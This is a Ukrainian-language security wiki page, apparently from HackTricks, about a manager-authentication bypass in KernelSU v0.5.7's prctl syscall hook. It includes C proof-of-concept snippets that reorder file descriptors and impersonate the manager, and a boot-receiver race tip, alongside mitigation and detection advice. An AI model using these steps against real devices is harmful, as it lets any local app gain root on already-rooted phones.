# Android Rooting Frameworks (KernelSU/Magisk) Manager Auth Bypass & Syscall Hook Abuse

{{#include ../../banners/hacktricks-training.md}}

Rooting frameworks на кшталт KernelSU, APatch, SKRoot і Magisk часто патчать ядро Linux/Android і надають привілейовану функціональність непривілейованому userspace-додатку-«manager» через hooked syscall. Якщо етап manager-аутентифікації має недолік, будь-який локальний додаток може отримати доступ до цього каналу та підвищити привілеї на вже rooted-пристроях.

На цій сторінці узагальнено техніки та проблеми, виявлені під час публічних досліджень (зокрема аналізу KernelSU v0.5.7 від Zimperium), щоб допомогти red і blue teams зрозуміти attack surfaces, exploitation primitives і надійні mitigations.<sup>[[1]](#references)</sup>

---
## Архітектурний шаблон: syscall-hooked manager channel

- Kernel module/patch встановлює hook на syscall (зазвичай prctl), щоб отримувати "commands" із userspace.
- Protocol зазвичай має вигляд: magic_value, command_id, arg_ptr/len ...
- Userspace manager app спочатку проходить authentication (наприклад, CMD_BECOME_MANAGER). Після того як kernel позначає caller як trusted manager, приймаються privileged commands:
- Надати root caller (наприклад, CMD_GRANT_ROOT)
- Керувати allowlists/deny-lists для su
- Змінювати SELinux policy (наприклад, CMD_SET_SEPOLICY)
- Запитувати version/configuration
- Оскільки будь-який app може викликати syscalls, коректність manager authentication має критичне значення.

Приклад (дизайн KernelSU):
- Hooked syscall: prctl
- Magic value для перенаправлення до KernelSU handler: 0xDEADBEEF
- Commands включають: CMD_BECOME_MANAGER, CMD_GET_VERSION, CMD_ALLOW_SU, CMD_SET_SEPOLICY, CMD_GRANT_ROOT тощо.

---
## Authentication flow KernelSU v0.5.7 (як реалізовано)

Коли userspace викликає prctl(0xDEADBEEF, CMD_BECOME_MANAGER, data_dir_path, ...), KernelSU перевіряє:

1) Перевірка префікса шляху
- Наданий path має починатися з очікуваного prefix для caller UID, наприклад /data/data/<pkg> або /data/user/<id>/<pkg>.
- Reference: core_hook.c (v0.5.7) path prefix logic.<sup>[[2]](#references)</sup>

2) Перевірка ownership
- Path має належати caller UID.
- Reference: core_hook.c (v0.5.7) ownership logic.<sup>[[2]](#references)</sup>

3) Перевірка APK signature через сканування FD table
- Виконати ітерацію по open file descriptors процесу, який викликає.
- Вибрати перший file, path якого відповідає /data/app/*/base.apk.
- Розібрати APK v2 signature і перевірити її відповідність official manager certificate.
- References: manager.c (iterating FDs), apk_sign.c (APK v2 verification).<sup>[[3]](#references)[[4]](#references)</sup>

Якщо всі перевірки успішні, kernel тимчасово кешує UID manager і приймає privileged commands від цього UID до reset.

---
## Клас vulnerability: довіра до “the first matching APK” під час FD iteration

Якщо signature check прив’язана до "the first matching /data/app/*/base.apk", знайденого в FD table процесу, насправді вона не перевіряє власний package caller. Attacker може заздалегідь відкрити легітимно signed APK (справжнього manager), щоб він з’явився у FD list раніше за їхній власний base.apk.

Ця trust-by-indirection дає змогу непривілейованому app impersonate manager без володіння manager signing key.<sup>[[1]](#references)</sup>

Ключові властивості, які експлуатуються:<sup>[[1]](#references)</sup>
- FD scan не прив’язаний до package identity caller; він лише порівнює path strings із pattern.
- open() повертає найменший доступний FD. Спочатку закривши FD з меншими номерами, attacker може контролювати порядок.
- Filter перевіряє лише те, що path відповідає /data/app/*/base.apk, — але не те, що він відповідає встановленому package caller.

---
## Передумови атаки

- Device уже rooted за допомогою vulnerable rooting framework (наприклад, KernelSU v0.5.7).
- Attacker може запускати довільний непривілейований code локально (Android app process).
- Справжній manager ще не пройшов authentication (наприклад, одразу після reboot). Деякі frameworks кешують manager UID після успішної authentication; необхідно виграти race.<sup>[[1]](#references)</sup>

---
## Загальна схема exploitation (KernelSU v0.5.7)

Кроки високого рівня:<sup>[[1]](#references)[[9]](#references)</sup>
1) Створити valid path до власного app data directory, щоб пройти перевірки prefix і ownership.
2) Переконатися, що genuine KernelSU Manager base.apk відкрито на FD з меншим номером, ніж власний base.apk.
3) Викликати prctl(0xDEADBEEF, CMD_BECOME_MANAGER, <your_data_dir>, ...), щоб пройти перевірки.
4) Виконати privileged commands, такі як CMD_GRANT_ROOT, CMD_ALLOW_SU, CMD_SET_SEPOLICY, щоб зберегти elevation.

Практичні примітки щодо кроку 2 (FD ordering):<sup>[[1]](#references)</sup>
- Визначити FD власного process для /data/app/*/base.apk, обійшовши symlinks у /proc/self/fd.
- Закрити low FD (наприклад, stdin, fd 0) і спочатку відкрити legitimate manager APK, щоб він зайняв fd 0 (або будь-який index, нижчий за FD власного base.apk).
- Вбудувати legitimate manager APK у свій app, щоб його path відповідав naive filter kernel. Наприклад, розмістити його в subpath, що відповідає /data/app/*/base.apk.

Приклади code snippets (Android/Linux, лише для ілюстрації):

Перелічити open FDs, щоб знайти entries base.apk:
```c
#include <dirent.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int find_first_baseapk_fd(char out_path[PATH_MAX]) {
DIR *d = opendir("/proc/self/fd");
if (!d) return -1;
struct dirent *e; char link[PATH_MAX]; char p[PATH_MAX];
int best_fd = -1;
while ((e = readdir(d))) {
if (e->d_name[0] == '.') continue;
int fd = atoi(e->d_name);
snprintf(link, sizeof(link), "/proc/self/fd/%d", fd);
ssize_t n = readlink(link, p, sizeof(p)-1);
if (n <= 0) continue; p[n] = '\0';
if (strstr(p, "/data/app/") && strstr(p, "/base.apk")) {
if (best_fd < 0 || fd < best_fd) {
best_fd = fd; strncpy(out_path, p, PATH_MAX);
}
}
}
closedir(d);
return best_fd; // First (lowest) matching fd
}
```
Примусово спрямувати FD із меншим номером на легітимний APK менеджера:
```c
#include <fcntl.h>
#include <unistd.h>

void preopen_legit_manager_lowfd(const char *legit_apk_path) {
// Reuse stdin (fd 0) if possible so the next open() returns 0
close(0);
int fd = open(legit_apk_path, O_RDONLY);
(void)fd; // fd should now be 0 if available
}
```
Автентифікація менеджера через хук prctl:
```c
#include <sys/prctl.h>
#include <stdint.h>

#define KSU_MAGIC          0xDEADBEEF
#define CMD_BECOME_MANAGER 0x100  // Placeholder; command IDs are framework-specific

static inline long ksu_call(unsigned long cmd, unsigned long arg2,
unsigned long arg3, unsigned long arg4) {
return prctl(KSU_MAGIC, cmd, arg2, arg3, arg4);
}

int become_manager(const char *my_data_dir) {
long result = -1;
// arg2: command, arg3: pointer to data path (userspace->kernel copy), arg4: optional result ptr
result = ksu_call(CMD_BECOME_MANAGER, (unsigned long)my_data_dir, 0, 0);
return (int)result;
}
```
Після успішного виконання привілейовані команди (приклади):
- CMD_GRANT_ROOT: підвищити поточний процес до root
- CMD_ALLOW_SU: додати ваш package/UID до allowlist для постійного su
- CMD_SET_SEPOLICY: налаштувати політику SELinux відповідно до можливостей framework

Порада щодо race/persistence:
- Зареєструйте receiver BOOT_COMPLETED в AndroidManifest (RECEIVE_BOOT_COMPLETED), щоб запускатися на ранньому етапі після перезавантаження та спробувати пройти authentication до справжнього manager.<sup>[[1]](#references)</sup>

---
## Рекомендації щодо виявлення та mitigation

Для розробників framework:
- Прив’язуйте authentication до package/UID викликача, а не до довільних FD:
- Визначайте package викликача за його UID і перевіряйте його відповідність signature встановленого package (через PackageManager), замість сканування FD.
- Якщо використовується лише kernel, застосовуйте стабільну ідентичність викликача (task creds) і перевіряйте її за стабільним джерелом істини, яким керує init/userspace helper, а не за FD процесу.
- Не використовуйте перевірки префікса шляху як ідентичність: викликач може тривіально виконати таку умову.
- Використовуйте challenge–response на основі nonce через канал і очищайте будь-яку кешовану ідентичність manager під час boot або після ключових подій.
- За можливості розгляньте authenticated IPC на основі binder замість перевантаження generic syscalls.

Для defenders/blue team:
- Виявляйте наявність rooting frameworks і процесів manager; відстежуйте виклики prctl із підозрілими magic constants (наприклад, 0xDEADBEEF), якщо у вас є kernel telemetry.
- У керованих fleet блокируйте або генеруйте alert для boot receivers від ненадійних package, які одразу після boot швидко виконують спроби привілейованих команд manager.
- Переконайтеся, що пристрої оновлені до patched версій framework; інвалідуйте кешовані ID manager після оновлення.

Обмеження атаки:
- Вона впливає лише на пристрої, які вже rooted за допомогою вразливого framework.
- Зазвичай потрібні перезавантаження/race window до authentication легітимного manager (деякі frameworks кешують UID manager до скидання).

---
## Пов’язані нотатки для різних frameworks

- Authentication на основі пароля (наприклад, історичні збірки APatch/SKRoot) може бути слабкою, якщо паролі можна вгадати/bruteforce або якщо перевірки містять помилки.<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- Authentication на основі package/signature (наприклад, KernelSU) за принципом є надійнішою, але має прив’язуватися до фактичного викликача, а не до непрямих артефактів на кшталт сканування FD.<sup>[[1]](#references)[[5]](#references)</sup>
- Magisk: CVE-2024-48336 (MagiskEoP) продемонструвала, що навіть зрілі екосистеми можуть бути вразливими до spoofing ідентичності, який призводить до виконання коду з root у контексті manager.<sup>[[1]](#references)[[8]](#references)</sup>

---
## Посилання

- [1] [Zimperium – The Rooting of All Evil: Security Holes That Could Compromise Your Mobile Device](https://zimperium.com/blog/the-rooting-of-all-evil-security-holes-that-could-compromise-your-mobile-device)
- [2] [KernelSU v0.5.7 – перевірки шляхів у core_hook.c (L193, L201)](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/core_hook.c#L193)
- [3] [KernelSU v0.5.7 – ітерація FD/перевірка signature у manager.c (L43+)](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/manager.c#L43)
- [4] [KernelSU – перевірка APK v2 у apk_sign.c (main)](https://github.com/tiann/KernelSU/blob/main/kernel/apk_sign.c#L319)
- [5] [Проєкт KernelSU](https://kernelsu.org/)
- [6] [APatch](https://github.com/bmax121/APatch)
- [7] [SKRoot](https://github.com/abcz316/SKRoot-linuxKernelRoot)
- [8] [MagiskEoP – CVE-2024-48336](https://github.com/canyie/MagiskEoP)
- [9] [Демонстраційне відео KSU PoC (Wistia)](https://zimperium-1.wistia.com/medias/ep1dg4t2qg?videoFoam=true)

{{#include ../../banners/hacktricks-training.md}}
